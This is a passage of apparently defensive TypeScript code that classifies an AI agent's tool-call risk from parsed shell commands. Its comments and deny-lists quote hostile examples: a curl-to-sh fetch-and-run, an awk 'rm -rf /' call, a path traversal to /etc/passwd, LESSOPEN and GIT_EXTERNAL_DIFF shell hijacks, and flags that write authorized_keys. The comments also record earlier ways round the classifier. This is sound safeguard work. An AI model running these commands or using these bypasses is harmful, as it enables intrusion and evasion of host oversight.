/**
 * Host Risk Inspector — derives a tool call's EFFECTIVE permission category
 * from HOST-OWNED signals only, never from plugin self-declared risk hints.
 *
 * Rationale (docs/architecture/architecture.md §6.3/§8;
 * project_permission_review_redesign): a tool that grades its own danger is
 * structurally not a control — the MCP spec is explicit that tool annotations
 * are untrusted hints ("a server can lie"). Agent hosts therefore classify risk
 * on the HOST side by parsing the command/args, and default-deny
 * mutation/network. This module is the LVIS analogue.
 *
 * Design constraints honoured here:
 *  - DEFAULT-STRICT: anything NOT confidently classifiable as read-only is
 *    treated as write-equivalent (`"write"`/`"shell"`/`"network"`), the safe
 *    direction. The inspector never auto-classifies DOWN to `"read"` without
 *    positive evidence.
 *  - HOST-OWNED SIGNALS ONLY: shell commands are parsed from the call args and
 *    matched against a built-in read-only command set; network reach is inferred
 *    from URL-shaped args — neither reads the declared category.
 *  - NO PATH CONTAINMENT HERE. Layer-1 containment has ONE authority,
 *    `isPathAllowed` (`permissions/allowed-directories.ts`), which BOTH
 *    enforcement (`PermissionManager.checkPathScope`) and the reviewer's
 *    {@link RuleBasedRiskClassifier} call. This module used to restate it, but
 *    the answer never reached the output: a path argument is write-equivalent
 *    whether it escapes the allowed scope (out-of-scope reach) or sits inside it
 *    (no read-only proof), and "no signal at all" is write-equivalent too.
 *    Containment refines nothing this function returns, so it is not computed —
 *    and with it goes the `realpath` walk-up that was this module's only I/O.
 *  - NO GLOBAL STATE and NO I/O: the inspector is pure string analysis.
 *
 * This module does NOT make the final permission decision and does NOT touch
 * {@link LlmRiskClassifier}. It only produces the effective `ToolCategory` that
 * the category × source × trust matrix and the reviewer lane then consume,
 * exactly where the declared category was consumed before.
 */
import type { ToolCategory } from "../../tools/types.js";
import { tokenizeShell, type ShellLeaf } from "../../main/shell-tokenizer.js";
import { extractShellCommands } from "../../shared/shell-command-fields.js";
import { hasNetworkTarget } from "./network-target.js";

/**
 * Built-in read-only command set — the host-side allow-list model. A compound
 * shell command is read-only ONLY IF every leaf command's head verb is in this set.
 * Anything unknown or mutating escalates to `"shell"` (default-strict).
 *
 * Kept deliberately conservative — the cost of omitting a genuinely read-only
 * command is an extra approval prompt (safe); the cost of wrongly including a
 * mutating command would be a silent classify-down (unsafe). New entries must
 * be provably side-effect-free in their bare form.
 */
const READ_ONLY_COMMANDS: ReadonlySet<string> = new Set([
  // NOTE: `less` and `more` are intentionally ABSENT. Both pagers hand control
  // to a shell: `less` runs `LESSOPEN`/`LESSCLOSE` input preprocessors (the
  // documented `|cmd %s` form pipes through an arbitrary program) and both
  // expose an interactive `!cmd` escape. The interpreter is chosen by the
  // environment, not by the argv the classifier can see, so there is no argv
  // shape that proves a paging call is side-effect-free. Paging a file is
  // `cat`'s job as far as this classifier is concerned.
  // `cd` changes the working directory of a shell that exits when the call
  // does — it mutates nothing on disk and does not persist to the next call
  // (each one spawns from the session cwd, and `input.cwd` is the supported way
  // to start elsewhere). What it DOES change is the meaning of every relative
  // operand after it, so it is only safe here because the shell path policy now
  // walks leaves in order and resolves each one against the directory actually
  // in effect. Without that walk, `cd /tmp && cat ../../etc/passwd` classified
  // read and resolved against the session cwd, which is inside the boundary.
  "cd",
  "ls", "cat", "head", "tail", "pwd", "echo", "printf",
  "grep", "egrep", "fgrep", "rg", "ag", "find", "fd", "wc", "stat", "file",
  "du", "df", "tree", "which", "type", "whoami", "id", "hostname", "uname",
  "date", "env", "printenv", "uptime", "ps", "top", "sort", "uniq", "cut",
  // NOTE: `awk` is intentionally ABSENT. awk has its own output-redirection
  // (`print > "file"`), pipe-to-command (`print | "cmd"`), and system() that
  // execute arbitrary code inside the awk-program string. These are opaque to
  // shell tokenization (correctly so — the shell sees a single-quoted literal
  // string). Classifying awk as read-only would require a full awk-language
  // parser; without one the classifier cannot distinguish `awk '{print $1}'`
  // from `awk 'BEGIN{system("rm -rf /")}'`. Any awk call therefore classifies
  // as `shell` (extra approval prompt — the safe, stated discipline of this module).
  "sed", "diff", "cmp", "basename", "dirname", "realpath", "readlink",
  "true", "false", "test", "sleep", "seq", "yes", "tr", "nl", "tac", "rev",
  // `split` is deliberately absent: with no flag at all it writes `xaa`, `xab`,
  // … into the working directory. It was in this set, and only stayed harmless
  // because its `null` entry in MUTATING_FLAGS escalated every call back to
  // shell. Listing a writing verb as read-only and relying on a second table to
  // undo it invites someone to prune the "redundant" entry.
  "column", "comm", "join", "paste", "expand", "unexpand", "fold",
]);

/**
 * Read-only verbs that nonetheless MUTATE when carrying certain flags. Even
 * though the head verb is in {@link READ_ONLY_COMMANDS}, a call carrying one of
 * these flags edits/creates/destroys files and must escalate to `"shell"`.
 *
 * `null` means the verb is ALWAYS mutating regardless of flags (it has no
 * side-effect-free form worth the read fast-path).
 *
 * Defense-in-depth note: `tee`, `dd`, `truncate`, and `split` are NOT in
 * {@link READ_ONLY_COMMANDS} and already fail closed as unknown verbs. Their
 * `null` entries here are retained so the MUTATING_FLAGS table stays accurate
 * if those verbs are ever added to READ_ONLY_COMMANDS in the future.
 *
 * That claim was false for `split` until now — it WAS in READ_ONLY_COMMANDS,
 * and this table was the only thing keeping `split hugefile` from classifying
 * read. The two tables now agree with this note.
 *
 * Flag matching — three modes, all applied:
 *  1. Long flags: exact-token (`--in-place`) or `--flag=value` prefix
 *     (`--in-place=.bak`), never a substring.
 *  2. Short-flag clusters: for verbs in this table, a single-dash non-`--` arg
 *     is mutating if any mutating SHORT LETTER appears in its leading
 *     letter-cluster. This catches `-i`, `-i.bak` (glued suffix), `-ibak`,
 *     `-ni` (combined with other flags), and `-iinplace` (gawk form). The
 *     cluster is the maximal run of ASCII letters at the start of the arg
 *     (stopping at the first non-letter, which for GNU sed/gawk can be a glued
 *     backup suffix). Example: `-ni.bak` → cluster `ni` → contains `i` → mutating.
 *  3. Dollar-expansion fail-closed: for mutating-CAPABLE verbs (those with a
 *     MUTATING_FLAGS entry), any argv token containing an unexpanded `$`
 *     (e.g. `$IFS`, `${IFS}`, `$var`) escalates to shell. This closes the
 *     `sed $IFS-i f` word-splitting vector where a runtime-expanded arg could
 *     smuggle a mutating flag past the flag scanner. Scoped to mutating-capable
 *     verbs only — `grep "$pattern" f` and `cat "$file"` stay read.
 */
const MUTATING_FLAGS: ReadonlyMap<string, ReadonlySet<string> | null> = new Map([
  ["sed",  new Set(["-i", "--in-place"])],
  // `awk` is NOT listed here — it is not in READ_ONLY_COMMANDS (see above),
  // so hasMutatingFlag is never called for awk. Entry removed to avoid confusion.
  ["find", new Set(["-delete", "-exec", "-execdir", "-ok", "-okdir",
                    "-fprint", "-fprint0", "-fprintf", "-fls"])],
  ["fd",   new Set(["-x", "--exec", "-X", "--exec-batch"])],
  ["sort", new Set(["-o", "--output"])],
  // ripgrep executes an arbitrary preprocessor per file with `--pre` (and picks
  // which files reach it with `--pre-glob`), and runs a binary for `--hostname-bin`.
  // Searching is read-only; handing rg a program to run is not.
  ["rg",   new Set(["--pre", "--pre-glob", "--hostname-bin"])],
  // Always-mutating (no side-effect-free bare form):
  ["tee",      null],  // always writes to every named file
  ["dd",       null],  // always reads/writes block devices or files
  ["truncate", null],  // always modifies file size
  ["split",    null],  // always writes output files (xaa… / prefix-based)
]);

/**
 * Short mutating flag letters per verb, for cluster/glued-suffix detection
 * (mode 2 above). Keyed by the same verb names as {@link MUTATING_FLAGS}.
 * A single-dash arg whose leading letter-cluster contains any of these letters
 * is treated as mutating regardless of what follows (glued suffix or combined
 * flags). Long-flag-only verbs (find, fd, sort) have no short mutating letter
 * and are handled by exact/prefix matching alone.
 */
const MUTATING_SHORT_LETTERS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  ["sed", new Set(["i"])],
  // `awk` removed — awk is not in READ_ONLY_COMMANDS, so this entry is dead.
  // `sort -o` takes its output file as either a separate token (`-o out`) or
  // glued to the flag (`-oout`, `-o/Users/x/.ssh/authorized_keys`). Exact-token
  // matching only sees the first form, so the glued form wrote the file while
  // classifying read. The cluster check covers both.
  ["sort", new Set(["o"])],
]);

/**
 * git subcommands whose INSPECTION is read-only. The subcommand alone is not a
 * proof: `git diff --output=~/.ssh/authorized_keys` writes a file the operand
 * scan never sees, and `--ext-diff`/`--textconv` hand the content to a
 * config-selected program. So membership here only means "this subcommand has
 * a read-only form"; every flag it carries must still clear
 * {@link GIT_INSPECTION_READ_ONLY_FLAGS} (allow-list, unknown flag → shell).
 * Subcommands that are read-only only for certain flag forms (`config`, `tag`,
 * `branch`, `remote`) are NOT listed here — {@link GIT_READ_ONLY_FLAGS} scans
 * ALL of their post-subcommand tokens, operands included.
 */
const READ_ONLY_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set([
  "status", "log", "diff", "show", "rev-parse",
  "describe", "blame", "shortlog", "ls-files", "ls-tree", "cat-file",
  "for-each-ref", "reflog", "whatchanged",
]);

/**
 * Long flags that keep an inspection subcommand read-only. ALLOW-LIST: a flag
 * outside this set escalates to `"shell"` — the same default-strict discipline
 * {@link GIT_READ_ONLY_FLAGS} applies to the ambiguous subcommands, extended to
 * the ones previously waved through on the subcommand name alone.
 *
 * Deliberately excluded (each is a real write/exec reach, and this is why the
 * list is an allow-list rather than a deny-list — the next one nobody thought
 * of also escalates): `--output`, `-o`, `--ext-diff`, `--textconv`,
 * `--output-indicator-*`, `-O<orderfile>`, `--upload-pack`, `--exec-path`,
 * `--filter-spec`.
 */
const GIT_INSPECTION_READ_ONLY_FLAGS: ReadonlySet<string> = new Set([
  // Output shaping
  "--oneline", "--graph", "--stat", "--numstat", "--shortstat", "--summary",
  "--name-only", "--name-status", "--raw", "--patch", "--no-patch",
  "--patch-with-stat", "--compact-summary", "--dirstat", "--pretty", "--format",
  "--abbrev", "--no-abbrev", "--abbrev-commit", "--no-abbrev-commit",
  "--date", "--color", "--no-color", "--color-words", "--word-diff",
  "--word-diff-regex", "--decorate", "--no-decorate", "--parents", "--children",
  "--full-index", "--binary", "--unified", "--inter-hunk-context",
  "--src-prefix", "--dst-prefix", "--no-prefix", "--default-prefix",
  "--relative", "--no-relative", "--find-renames", "--find-copies",
  "--find-copies-harder", "--no-renames", "--irreversible-delete",
  "--diff-filter", "--diff-algorithm", "--histogram", "--patience", "--minimal",
  "--ignore-all-space", "--ignore-space-change", "--ignore-space-at-eol",
  "--ignore-blank-lines", "--ignore-cr-at-eol", "--ignore-submodules",
  "--submodule", "--exit-code", "--quiet", "--stat-width", "--stat-name-width",
  "--numbered-lines", "--line-porcelain", "--porcelain", "--short", "--long",
  "--branch", "--show-stash", "--ahead-behind", "--no-ahead-behind",
  "--untracked-files", "--ignored", "--column", "--no-column", "--null",
  "--batch", "--batch-check", "--batch-all-objects", "--textconv-cache",
  // Selection / traversal
  "--all", "--branches", "--tags", "--remotes", "--glob", "--exclude",
  "--max-count", "--skip", "--since", "--after", "--until", "--before",
  "--author", "--committer", "--grep", "--grep-reflog", "--all-match",
  "--invert-grep", "--regexp-ignore-case", "--basic-regexp",
  "--extended-regexp", "--fixed-strings", "--perl-regexp",
  "--merges", "--no-merges", "--min-parents", "--max-parents",
  "--no-min-parents", "--no-max-parents", "--first-parent", "--follow",
  "--reverse", "--topo-order", "--date-order", "--author-date-order",
  "--ancestry-path", "--simplify-by-decoration", "--full-history",
  "--sparse", "--dense", "--cherry-pick", "--left-right", "--boundary",
  "--merge-base", "--cached", "--staged", "--merge", "--no-index",
  "--find-object", "--pickaxe-all", "--pickaxe-regex",
  "--reverse-blame", "--show-email", "--root", "--no-walk", "--do-walk",
  "--cc", "--diff-merges", "--no-diff-merges", "--remerge-diff",
  // rev-parse / ls-files / for-each-ref shapes
  "--verify", "--symbolic", "--symbolic-full-name", "--abbrev-ref",
  "--show-toplevel", "--show-cdup", "--show-prefix", "--git-dir",
  "--git-common-dir", "--absolute-git-dir", "--is-inside-work-tree",
  "--is-inside-git-dir", "--is-bare-repository", "--is-shallow-repository",
  "--show-superproject-working-tree", "--sq", "--not", "--flags", "--no-flags",
  "--revs-only", "--no-revs", "--default", "--prefix", "--end-of-options",
  "--others", "--deleted", "--modified", "--stage", "--unmerged",
  "--exclude-standard", "--directory", "--error-unmatch", "--full-name",
  "--recurse-submodules", "--count", "--sort", "--contains", "--no-contains",
  "--merged", "--no-merged", "--points-at", "--tags-only", "--refs",
  "--type", "--objects", "--object-only", "--allow-unknown-type",
  "--follow-symlinks", "--name-rev", "--always", "--dirty", "--broken",
  "--committish", "--summary-only", "--numbered", "--email", "--group",
  "--incremental", "--line-number", "--score-debug", "--show-name",
  "--show-number", "--reverse-order", "--indent-heading",
]);

/**
 * Short-flag letters that keep an inspection subcommand read-only, matched per
 * letter so clusters (`-sn`) and glued values (`-U5`, `-M50%`) are covered.
 * Same allow-list discipline: a letter outside this set escalates.
 *
 * `o` is deliberately absent — `-o` is `--output` for the diff family and
 * `-O<orderfile>` reads a caller-named file.
 */
const GIT_INSPECTION_READ_ONLY_SHORT_LETTERS: ReadonlySet<string> = new Set([
  // diff/log shaping: -p -u -s -U<n> -w -b -W -z -q -M -C -B -D -R -I
  "p", "u", "s", "U", "w", "b", "W", "z", "q", "M", "C", "B", "D", "R", "I",
  // log/blame selection: -n<n> -L -S -G -i -E -F -P -g -m -c -t -l -f -e -v -r -a
  "n", "L", "S", "G", "i", "E", "F", "P", "g", "m", "c", "t", "l", "f", "e",
  "v", "r", "a",
]);

/**
 * Flags that keep an otherwise-ambiguous git subcommand in read-only territory.
 * For `config`, `tag`, `branch`, and `remote` the PRESENCE of a non-flag
 * operand (beyond the subcommand itself) or a write-mode flag means mutation.
 * These sets list the ONLY flags that are unambiguously read — everything else
 * escalates. Default-strict: unknown flags → shell.
 */
const GIT_READ_ONLY_FLAGS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
  // `git config --list`, `git config --get key`, `git config --get-all key`
  // are reads. `git config section.key value` or any write flag mutates.
  ["config", new Set(["-l", "--list", "--get", "--get-all", "--get-regexp",
                      "--get-urlmatch", "--global", "--system", "--local",
                      "--worktree", "--show-origin", "--show-scope",
                      "--type", "--bool", "--int", "--bool-or-int",
                      "--path", "--expiry-date", "--null", "-z",
                      "--name-only", "--includes", "--no-includes",
                      "--default", "-e", "--edit"])],
  // `git tag` / `git tag -l` / `git tag --list` are reads.
  // `git tag v2`, `git tag -d v1`, `git tag -a v2` etc. mutate.
  ["tag",    new Set(["-l", "--list", "--sort", "--format", "--color",
                      "--column", "--no-column", "--merged", "--no-merged",
                      "--contains", "--no-contains", "--points-at",
                      "--create-reflog"])],
  // `git branch` / `git branch -a` / `git branch -r` / `git branch --list`
  // are reads. `git branch -D f`, `git branch -m f g`, `git branch newname`
  // mutate.
  ["branch", new Set(["-a", "--all", "-r", "--remotes", "-l", "--list",
                      "-v", "--verbose", "-vv", "--format", "--sort",
                      "--color", "--no-color", "--column", "--no-column",
                      "--merged", "--no-merged", "--contains", "--no-contains",
                      "--points-at", "--show-current"])],
  // `git remote` / `git remote -v` / `git remote show <name>` are reads.
  // `git remote add`, `git remote remove`, `git remote set-url` mutate.
  ["remote", new Set(["-v", "--verbose", "show", "get-url"])],
]);

/**
 * Environment assignments that choose WHAT the verb runs, rather than tuning
 * how it runs. The tokenizer strips leading `NAME=value` words to expose the
 * effective verb; for these names the stripped word IS the execution, so the
 * verb scan alone is not evidence of anything:
 *
 *   LESSOPEN='|/bin/sh %s' less f     → less pipes the file through /bin/sh
 *   GIT_EXTERNAL_DIFF=/bin/sh git diff → git execs /bin/sh per changed path
 *
 * Deny-list rather than allow-list, deliberately and narrowly: the ordinary
 * `FOO=bar cmd` / `env LANG=C cmd` shape is the overwhelming majority and is
 * genuinely inert, so an allow-list here would escalate almost every real call
 * without a matching increase in safety. The escalation is instead keyed on the
 * property that actually matters — the variable names a program consults to
 * pick an interpreter, pager, editor, diff/merge driver, or preloaded library.
 */
const EXECUTION_SELECTING_ENV_NAMES: ReadonlySet<string> = new Set([
  // Pagers / preprocessors
  "LESSOPEN", "LESSCLOSE", "LESSEDIT", "LESSMETAECHO", "PAGER", "MANPAGER",
  "GIT_PAGER", "SYSTEMD_PAGER",
  // Editors (invoked as a program by many read-looking commands)
  "EDITOR", "VISUAL", "GIT_EDITOR", "GIT_SEQUENCE_EDITOR",
  // git external programs
  "GIT_EXTERNAL_DIFF", "GIT_DIFF_OPTS", "GIT_SSH", "GIT_SSH_COMMAND",
  "GIT_PROXY_COMMAND", "GIT_ASKPASS", "SSH_ASKPASS", "GIT_TEXTCONV",
  "GIT_ALTERNATE_OBJECT_DIRECTORIES", "GIT_DIR", "GIT_WORK_TREE",
  "GIT_INDEX_FILE", "GIT_CONFIG", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM",
  "GIT_CONFIG_COUNT", "GIT_ATTR_NOSYSTEM", "GIT_NAMESPACE",
  // Shell / interpreter selection and startup hooks
  "SHELL", "BASH_ENV", "ENV", "IFS", "PATH", "CDPATH", "SHELLOPTS",
  "BASH_FUNC_", "PS4", "PROMPT_COMMAND",
  // Dynamic-linker injection
  "LD_PRELOAD", "LD_LIBRARY_PATH", "LD_AUDIT", "DYLD_INSERT_LIBRARIES",
  "DYLD_LIBRARY_PATH", "DYLD_FRAMEWORK_PATH",
  // Language-runtime startup hooks
  "PERL5OPT", "PERL5LIB", "PERLIO", "PYTHONSTARTUP", "PYTHONPATH",
  "PYTHONEXECUTABLE", "NODE_OPTIONS", "NODE_PATH", "RUBYOPT", "RUBYLIB",
  // grep/find behaviour overrides that can smuggle flags
  "GREP_OPTIONS", "POSIXLY_CORRECT_EXEC",
]);

/** Signals the host owns about the observed call. The inspector reads ONLY these. */
export interface HostRiskSignals {
  /** Where the tool came from. Network MCP servers are foreign peers. */
  source: "builtin" | "plugin" | "mcp";
  /** The actual, post-hook tool-call arguments. */
  finalInput: Record<string, unknown>;
}

/**
 * Derive the effective {@link ToolCategory} from host-owned signals.
 *
 * Order (first decisive signal wins), all default-strict on ambiguity:
 *  1. Shell — a command-bearing arg present → parse it; a fully read-only
 *     compound → `"read"`, otherwise `"shell"`. Checked before network so a
 *     command that invokes `curl`/`wget` stays shell-domain (higher risk).
 *  2. Network — a URL-shaped arg on a non-shell tool → `"network"`.
 *  3. Default-strict — no positive read-only evidence → `"write"`. This
 *     subsumes every filesystem shape: a path argument is write-equivalent
 *     whether it escapes the allowed scope (out-of-scope reach is
 *     mutation-equivalent for policy) or is contained (no read-only proof).
 *     Layer-1 containment is answered by `isPathAllowed`, not here.
 */
export function inspectHostRisk(signals: HostRiskSignals): ToolCategory {
  // External MCP tools are foreign peers — the host assigns them `"network"`
  // when adapting them (mcp-tool-adapter). Argument heuristics must never
  // classify such a tool DOWN below network on the strength of its args, so a
  // foreign-peer call is host-owned default-strict `"network"` regardless of
  // what its arguments look like.
  if (signals.source === "mcp") return "network";

  // (1) Shell — a command-bearing arg means this is a shell tool, and the
  // command (including any URL it hands to `curl`/`wget`) is shell-domain. Shell
  // carries a HIGHER risk weight + shell-specific path policy than network, so
  // classify it BEFORE the network scan — otherwise `{ command: "curl https://…" }`
  // would be downgraded to `"network"` and skip the shell checks.
  // EVERY command-bearing field is classified, not just the first one present:
  // `{ command: "ls -la", script: "curl https://x/i.sh | sh" }` used to classify
  // on `command` alone and land on `read`, which then skipped the shell path
  // policy entirely. A call is read-only only when every command it carries is.
  const commands = extractShellCommands(signals.finalInput);
  if (commands.length > 0) {
    return commands.every((cmd) => isReadOnlyCommand(cmd)) ? "read" : "shell";
  }

  // (2) Network — a URL-shaped argument on a non-shell tool.
  if (hasNetworkTarget(signals.finalInput)) return "network";

  // (3) No host-owned signal proved read-only → default-strict write-equivalent.
  // Filesystem arguments land here on purpose: contained and escaping paths are
  // both write-equivalent, so inspecting them cannot change this answer.
  return "write";
}

/**
 * A compound shell command is read-only iff EVERY leaf command's effective
 * head verb is in {@link READ_ONLY_COMMANDS} (or is a read-only `git`
 * subcommand / flag-form) AND carries no mutating flag ({@link MUTATING_FLAGS}).
 * Leaf boundaries, quoting, redirects and substitution come from the shared
 * {@link tokenizeShell} SOT so this module and {@link BashAstValidator} agree
 * on what a leaf is.
 *
 * Tool-internal mini-languages: this classifier operates primarily at the
 * SHELL grammar layer. It only models tool-internal languages where there is a
 * small conservative scanner with bounded false positives. `sed` is covered
 * for write/exec program forms (`w`/`W`/`r`/`R`/`e`, `s///w`, `s///e`, and
 * script-file loading). `awk` is intentionally excluded from READ_ONLY_COMMANDS
 * because safe classification would require a full awk-language parser.
 *
 * Tighten-only claim (precise): every `read→shell` transition introduced by
 * this change is a genuine tighten — a command that WAS safe to classify read
 * is now escalated because we detect a mutating flag or write git subcommand
 * form. A small enumerated set of `shell→read` transitions also exists; these
 * are NOT hardenings — they are CORRECTIONS of prior mis-classifications where
 * the old naive tokenizer wrongly classified a benign command as shell:
 *   - `grep "a && b" f`   — `&&` was inside a quoted arg, not a separator
 *   - `grep '$(whoami)' f`— `$(` was inside a single-quoted arg (no execution)
 *   - `echo '\`rm\`' f`   — backtick inside single quotes (no execution)
 *   - `env X=1 ls`        — old tokenizer did not strip env-style assignments
 * Each of these is provably side-effect-free and is tested explicitly below.
 * The differential/property test in the test file asserts the full enumerated
 * correction set and proves no other shell→read transition occurs.
 *
 * Fails closed to non-read-only on:
 *  - a parse error (unbalanced quotes/parens),
 *  - any command/process substitution (`$(…)`, backticks, `<(…)`, `>(…)`) —
 *    hidden commands the head-verb scan cannot see,
 *  - any redirect, input OR output (`>`, `>>`, `2>`, `&>`, `<`, `<<`). Output
 *    redirects write a file; input redirects reach a file the argv-path check
 *    cannot contain. Failing closed on BOTH preserves the prior fail-closed
 *    set (a char-class guard on `< > \` $(`).
 */
export function isReadOnlyCommand(command: string): boolean {
  const { leaves, parseError } = tokenizeShell(command);
  if (parseError) return false;
  if (leaves.length === 0) return false;
  return leaves.every((leaf) => isReadOnlyLeaf(leaf));
}

function isReadOnlyLeaf(leaf: ShellLeaf): boolean {
  // Any hidden execution or redirect (output OR input) taints the whole
  // command (default-strict — see the doc comment on isReadOnlyCommand).
  // hasOutputRedirect covers both file-target redirects AND fd-dup (>&m, n>&m)
  // so `ls 2>&1` / `ls >&2` correctly stay shell — they have an output-redirect
  // operator even though no file target is named.
  if (leaf.hasCommandSubstitution || leaf.hasProcessSubstitution) return false;
  if (leaf.hasOutputRedirect || leaf.hasInputRedirect) return false;

  // An assignment that selects the interpreter/pager/diff-driver the verb then
  // runs is the execution, not a detail of it. The tokenizer strips assignments
  // to expose the verb; discarding them silently is what let
  // `LESSOPEN='|/bin/sh %s' less f` read as `less`.
  if (leaf.assignments.some(selectsExecutionTarget)) return false;

  const argv = leaf.argv;
  if (argv.length === 0) {
    // The leaf was only assignments/wrappers. A bare read-only wrapper verb
    // (`env`, which prints the environment) is read-only; a bare incomplete
    // wrapper (`timeout`, `nice`) is not. The first stripped wrapper is the
    // effective verb the leaf would have run.
    const bareVerb = leaf.strippedWrappers[0];
    return bareVerb !== undefined && READ_ONLY_COMMANDS.has(bareVerb);
  }

  const verb = stripPath(argv[0]!);
  if (verb === "git") {
    return isReadOnlyGitLeaf(argv);
  }
  if (!READ_ONLY_COMMANDS.has(verb)) return false;
  // A read-only verb still MUTATES when carrying a mutating flag (`sed -i`,
  // `find … -delete`, …). Escalate to non-read-only.
  if (hasMutatingFlag(verb, argv.slice(1), leaf.argvHasExpandableDollar.slice(1))) return false;
  return true;
}

/**
 * True when a stripped `NAME=value` assignment picks the program a later verb
 * will execute (see {@link EXECUTION_SELECTING_ENV_NAMES}).
 *
 * Two independent triggers, either one escalating:
 *  1. The NAME is execution-selecting (exact match, or one of the `BASH_FUNC_x`
 *     style prefixed families that export shell functions into the child).
 *  2. The VALUE is shaped like a program invocation — a leading `|` (the
 *     `LESSOPEN` pipe form) or an absolute/relative path to an interpreter.
 *     This catches an execution-selecting variable this list has not learned
 *     about yet, which is the failure mode a pure name list cannot cover.
 */
function selectsExecutionTarget(assignment: string): boolean {
  const eq = assignment.indexOf("=");
  if (eq <= 0) return false;
  const name = assignment.slice(0, eq);
  const value = assignment.slice(eq + 1);
  if (EXECUTION_SELECTING_ENV_NAMES.has(name)) return true;
  for (const prefixed of EXECUTION_SELECTING_ENV_NAMES) {
    if (prefixed.endsWith("_") && name.startsWith(prefixed)) return true;
  }
  if (value.startsWith("|")) return true;
  return /(?:^|[\s/])(?:ba|da|z|k|tc|c)?sh\b|(?:^|[\s/])(?:python[0-9.]*|perl|ruby|node|osascript|env)\b/.test(value);
}

/**
 * True when the git leaf (full argv, `argv[0] === "git"`) is read-only.
 *
 * Unconditionally-read subcommands pass immediately. Ambiguous subcommands
 * (`config`, `tag`, `branch`, `remote`) are read-only ONLY when EVERY
 * post-subcommand token is a flag listed in {@link GIT_READ_ONLY_FLAGS} — any
 * non-flag operand or write-mode flag escalates to shell. Default-strict:
 * unlisted subcommands (including `commit`, `push`, `merge`, …) are shell.
 */
function isReadOnlyGitLeaf(argv: readonly string[]): boolean {
  const sub = argv[1];
  if (typeof sub !== "string") return false;
  if (READ_ONLY_GIT_SUBCOMMANDS.has(sub)) {
    // The subcommand name is not the whole answer: `git diff
    // --output=~/.ssh/authorized_keys` writes, `git show --ext-diff` execs.
    // Every FLAG must be in the read-only allow-list; non-flag tokens are
    // revisions/pathspecs and are answered by path containment, not here.
    return argv.slice(2).every(isReadOnlyGitInspectionToken);
  }
  const readFlags = GIT_READ_ONLY_FLAGS.get(sub);
  if (readFlags === undefined) return false; // unlisted → shell
  // Every token after the subcommand must be in the read-only flag set.
  // A bare `git remote` (no args after sub) and `git branch` (no args) are
  // read-only listing forms — allowed when postArgs is empty.
  const postArgs = argv.slice(2);
  return postArgs.every((t) => readFlags.has(t));
}

/**
 * True when one post-subcommand token of an inspection subcommand keeps the
 * leaf read-only. Allow-list: an unrecognised FLAG escalates.
 *
 * `--` ends option parsing, so everything after it is a pathspec — but the
 * caller scans tokens independently and a bare `--` is itself inert, so it is
 * simply accepted; a pathspec that happens to start with `-` after `--` is a
 * false escalation (a prompt), never a false pass.
 */
function isReadOnlyGitInspectionToken(token: string): boolean {
  if (!token.startsWith("-")) return true;   // revision / pathspec operand
  if (token === "-" || token === "--") return true;
  if (token.startsWith("--")) {
    const eq = token.indexOf("=");
    const name = eq > 0 ? token.slice(0, eq) : token;
    return GIT_INSPECTION_READ_ONLY_FLAGS.has(name);
  }
  // `git log -5` — a bare count shortcut, no letters to check.
  if (/^-[0-9]+$/.test(token)) return true;

  // A flag that takes a glued value: the letter is the flag and everything
  // after it is its argument, so the cluster scan stops there.
  //
  // Only stopping at the first NON-letter is not enough. That works for `-U5`
  // and `-M50%`, where a digit ends the run, and fails for an alphabetic value:
  // `-Sneedle` scanned as the cluster `Sneedle`, and `d` is not an allow-listed
  // letter, so searching a diff for a string prompted while `-S needle` — the
  // same search, spelled with a space — did not.
  const valueTaking = /^-([A-Za-z])(.+)$/.exec(token);
  if (valueTaking && GIT_VALUE_TAKING_SHORT_FLAGS.has(valueTaking[1]!)) {
    return GIT_INSPECTION_READ_ONLY_SHORT_LETTERS.has(valueTaking[1]!);
  }

  // Short flags: every letter in the leading cluster must be allow-listed.
  const cluster = /^-([A-Za-z]+)/.exec(token);
  if (cluster === null) return false;
  for (const letter of cluster[1]!) {
    if (!GIT_INSPECTION_READ_ONLY_SHORT_LETTERS.has(letter)) return false;
  }
  return true;
}

/**
 * Git short flags whose value may be gluéd directly onto the letter, so the
 * characters after it are an operand rather than more flags.
 *
 * Being in this set does NOT make a flag read-only — the letter is still
 * checked against {@link GIT_INSPECTION_READ_ONLY_SHORT_LETTERS}. It only
 * decides where the flag ends, which is what stops an alphabetic value from
 * being misread as a cluster of unknown flag letters.
 */
const GIT_VALUE_TAKING_SHORT_FLAGS: ReadonlySet<string> = new Set([
  "S", // -S<string>  pickaxe search
  "G", // -G<regex>   diff-content search
  "L", // -L<range>   line-range log / blame
  "U", // -U<n>       context lines
  "M", // -M<n>       rename detection threshold
  "C", // -C<n>       copy detection threshold
  "B", // -B<n>       break-rewrite threshold
  "I", // -I<regex>   ignore matching changes
  "n", // -n<n>       max count
]);

/**
 * True when `verb`'s argument tokens carry a flag that turns a read-only verb
 * into a mutating one (per {@link MUTATING_FLAGS} / {@link MUTATING_SHORT_LETTERS}).
 *
 * Three matching modes (all applied):
 *  1. Exact-token long flags: `-i`, `--in-place`, `-delete`, etc.
 *  2. `--flag=value` prefix: `--in-place=.bak` matches `--in-place`.
 *  3. Short-flag cluster/glue (for verbs in {@link MUTATING_SHORT_LETTERS}):
 *     a single-dash non-`--` arg is mutating if any mutating letter appears in
 *     its leading letter-cluster. `-ni.bak` → cluster `ni` → contains `i` →
 *     mutating. `-ibak` → cluster `ibak` → contains `i` → mutating.
 *  4. Dollar-expansion fail-closed (for any mutating-capable verb): if an argv
 *     token contains an unexpanded `$`, the runtime shell may expand it into a
 *     mutating flag (e.g. `sed $IFS-i f`). Fail closed → shell.
 */
function hasMutatingFlag(
  verb: string,
  args: readonly string[],
  argsHaveExpandableDollar: readonly boolean[],
): boolean {
  if (!MUTATING_FLAGS.has(verb)) return false;
  // `.get()` is always defined here because `.has()` just returned true;
  // TypeScript cannot narrow Map.get() through .has() so we assert non-null.
  const flagSet = MUTATING_FLAGS.get(verb)!;
  if (flagSet === null) return true; // always-mutating verb

  const shortLetters = MUTATING_SHORT_LETTERS.get(verb);

  for (const [index, arg] of args.entries()) {
    // Mode 4: dollar-expansion in any arg for this mutating-capable verb.
    // Keyed on whether the shell will actually EXPAND that `$`, not on the
    // character being present. A `$` inside `'...'` is literal, so it cannot
    // split into a flag this scan never saw — which is the entire reason this
    // mode exists. Without the distinction `rg 'foo$'` classified shell while
    // `grep 'foo$' f` classified read, purely because rg has an entry in
    // MUTATING_FLAGS and grep does not.
